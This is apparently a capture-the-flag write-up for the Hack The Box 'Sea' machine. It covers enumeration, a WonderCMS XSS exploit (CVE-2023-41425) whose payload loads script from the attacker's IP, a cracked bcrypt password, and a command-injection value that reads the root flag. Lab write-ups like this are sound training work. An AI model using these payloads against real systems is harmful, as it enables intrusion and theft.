# About
`Sea` is an Easy Difficulty Linux machine that features [CVE-2023-41425](https://nvd.nist.gov/vuln/detail/CVE-2023-41425) in WonderCMS, a cross-site scripting (XSS) vulnerability that can be used to upload a malicious module, allowing access to the system. The privilege escalation features extracting and cracking a password from WonderCMS's database file, then exploiting a command injection in custom-built system monitoring software, giving us root access. 

# Enumeration
```
nmap -A -T4 -p- 10.129.62.226
sudo autorecon 10.129.62.226
```
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```


## Web
```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.62.226:80/FUZZ

gobuster dir -u http://10.129.62.226:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```
```
/home                 (Status: 200) [Size: 3695]
/0                    (Status: 200) [Size: 3695]
/themes               (Status: 301) [Size: 236] [--> http://10.129.62.226/themes/]
/data                 (Status: 301) [Size: 234] [--> http://10.129.62.226/data/]
/plugins              (Status: 301) [Size: 237] [--> http://10.129.62.226/plugins/]
/messages             (Status: 301) [Size: 238] [--> http://10.129.62.226/messages/]
/404                  (Status: 200) [Size: 3386]
```

We know some of the directories, lets try to enumerate some of these sub directories as it appears we cannot hit the top levels of any of these.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.62.226:80/themes/FUZZ -recursion -recursion-depth 1 -v
```

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.62.226:80/themes/bike/FUZZ
```
```
img                     [Status: 301, Size: 245, Words: 14, Lines: 8, Duration: 47ms]
home                    [Status: 200, Size: 3695, Words: 582, Lines: 87, Duration: 51ms]
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 39ms]
css                     [Status: 301, Size: 245, Words: 14, Lines: 8, Duration: 44ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 47ms]
404                     [Status: 200, Size: 3386, Words: 530, Lines: 85, Duration: 49ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 43ms]
%20                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 44ms]
```
We have found some files under the themes/bike directory lets see if we can access any of theme to get some more information about the underlying system.

![](Images/Pasted%20image%2020250502084457.png)

In the `LICENSE` file we get a theme `turboblack` which leads us to the CMS `WonderCMS`

`CVE-2023-41425`

![](Images/Pasted%20image%2020250502084747.png)

# Exploit CVE-2023-41425

Download the exploit [Here](https://github.com/prodigiousMind/CVE-2023-41425/blob/main/exploit.py)

It takes 3 arguments:
    URL: where WonderCMS is installed (no need to know the password)
    IP: attacker's Machine IP
    Port No: attacker's Machine PORT

```
python3 WonderCMS.py http://sea.htb/index.php?page=LoginURL 10.10.14.251 4444
```

Submit the following through the contact.php page for payload

```
http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.251:8000/xss.js"></script><form+action="
```

The destination server grabs out malicious js file.

![](Images/Pasted%20image%2020250502090722.png)


This POC did not end up working, I ended up following the writeup [Here](https://0xdf.gitlab.io/2024/12/21/htb-sea.html#shell-as-www-data)to get the initial shell to practice Linux priv esc.

# Post-Exploitation

Upon getting the first shell I began by starting some generic file enumeration of the web root folder.

![](Images/Pasted%20image%2020250502094332.png)

Within these files was a database.js file that looked promising. Within this file appears to be a user hash.

```
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2025\/05\/02 13:36:33": "127.0.0.1",
            "2025\/05\/02 13:26:02": "127.0.0.1",
            "2025\/05\/02 13:24:32": "127.0.0.1",
            "2024\/07\/31 15:17:10": "127.0.0.1",
            "2024\/07\/31 15:15:10": "127.0.0.1"
        },

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

Lets see what we can do with hashcat. After some quick google searching this is a Blowfish or bcrypt hash `-m 3200` in hashcat.

![](Images/Pasted%20image%2020250502095033.png)

We get the password `mychemicalromance` from the hash. I need to find a user to go along with that hash, we have access to read `/etc/passwd` so I am going to grab some users to test.

```
amay:mychemicalromance
```

With the found credentials we were able to establish an SSH session as amay. We can now grab the user flag and move on.

![](Images/Pasted%20image%2020250502095418.png)

After doing some enumeration we can find that the server is listening on a couple of ports from localhost such as tcp:8080

![](Images/Pasted%20image%2020250502095507.png)

Lets forward the port to our local machine using ssh.

```
ssh amay@sea.htb -L 8080:127.0.0.1:8080
```

Upon navigating to `localhost:8080` we are greeted by a default http authentication that can be passed with the amay credentials.

![](Images/Pasted%20image%2020250502095850.png)

My first gut instinct is to use the Analyze Log file to get LFI to read the root flag. Lets try that first

![](Images/Pasted%20image%2020250502100028.png)

Adjusting the path to relative path to try and read flag.txt did not seem to work

![](Images/Pasted%20image%2020250502100228.png)

Trying to read the absolute path of the `user.txt` also did not work so I don't think we are looking for lfi, so what about command injection

![](Images/Pasted%20image%2020250502100330.png)

We were able to get command injection by escaping and adding our command followed by commenting out the rest of the commands.

![](Images/Pasted%20image%2020250502100652.png)

Now lets see if we can get that root flag now.
```
log_file=;cat+/root/root.txt+#&analyze_log=
```

![](Images/Pasted%20image%2020250502100904.png)


